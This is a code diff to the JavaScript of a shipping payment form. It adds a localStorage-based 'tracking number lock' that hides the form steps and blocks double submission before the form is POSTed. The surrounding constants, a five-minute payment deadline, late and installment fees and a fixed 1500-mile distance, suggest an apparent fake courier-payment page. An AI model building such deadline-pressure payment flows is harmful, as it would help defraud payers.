@@ -210,6 +210,28 @@ let INSTALLMENT_FEE_RATE = 0.10;
 let LATE_FEE_RATE = 0.05;
 let DEADLINE_MINUTES = 5;
 
+/* ===== TRACKING NUMBER LOCK SYSTEM ===== */
+function getTrackingLockKey(){
+    return "tcl_locked_" + tracking_id.value;
+}
+
+document.addEventListener("DOMContentLoaded", function(){
+    const lockKey = getTrackingLockKey();
+    if(localStorage.getItem(lockKey)==="true"){
+        formPage.classList.add("hidden");
+        review.classList.add("hidden");
+        summary.classList.add("hidden");
+        installments.classList.add("hidden");
+        methods.classList.add("hidden");
+        wait.classList.add("hidden");
+        final.classList.remove("hidden");
+        document.querySelectorAll(".action").forEach(btn=>{
+            btn.style.pointerEvents="none";
+            btn.style.opacity="0.6";
+        });
+    }
+});
+
 /* PHONE FORMAT (UNCHANGED) */
 function formatPhone(input, code) {
 let d = input.value.replace(/\D/g,'');
@@ -249,7 +271,7 @@ return;
 startReview();
 }
 
-/* PAYMENT ENGINE (FIXED DISPLAY ONLY) */
+/* PAYMENT ENGINE */
 function calculatePayment(){
 const distanceMiles=1500;
 const ratePerMile=0.75;
@@ -274,7 +296,7 @@ deposit.textContent=depositVal.toFixed(2);
 balance.textContent=balanceVal.toFixed(2);
 }
 
-/* ALL FLOW FUNCTIONS BELOW ARE UNCHANGED */
+/* ALL FLOW FUNCTIONS */
 function startReview(){
 owner_phone_full.value=owner_code.value+' '+owner_phone.value;
 receiver_phone_full.value=receiver_code.value+' '+receiver_phone.value;
@@ -361,7 +383,18 @@ summary.classList.remove('hidden');
 }
 
 function finish(method){
+const lockKey = getTrackingLockKey();
+if(localStorage.getItem(lockKey)==="true") return; // Prevent double submission
+
 payment_method.value=method;
+localStorage.setItem(lockKey,"true"); // LOCK this tracking number
+
+/* Disable all clickable actions */
+document.querySelectorAll(".action").forEach(btn=>{
+btn.style.pointerEvents="none";
+btn.style.opacity="0.6";
+});
+
 fetch(mainForm.action,{method:'POST',body:new FormData(mainForm)});
 methods.classList.add('hidden');
 final.classList.remove('hidden');
